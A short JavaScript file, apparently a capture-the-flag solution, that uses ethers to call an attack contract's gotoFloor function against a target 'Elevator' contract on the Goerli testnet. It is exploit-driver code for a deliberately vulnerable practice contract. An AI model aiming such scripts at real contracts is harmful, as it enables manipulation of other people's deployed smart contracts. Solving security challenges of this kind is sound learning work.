require("dotenv").config()

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const ELEVATOR_ADDRESS = "0x15dc92718f092EF31655e17Cc3E1d1a3aC62789f";
const ELEVATOR_ATTACK_ADDRESS = "0xBCBC4CCf42A55D60cAFdA485E17a3E4056cEc792"

const contractABI = require("../artifacts/contracts/AttackElevator.sol/AttackElevator.json");

// Provider
const provider = ethers.getDefaultProvider('goerli');

// Signer
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

// Contract
const attackElevator = new ethers.Contract(ELEVATOR_ATTACK_ADDRESS, contractABI.abi, signer);

async function main() {
  const tx = await attackElevator.gotoFloor(ELEVATOR_ADDRESS, 3);
}

main();
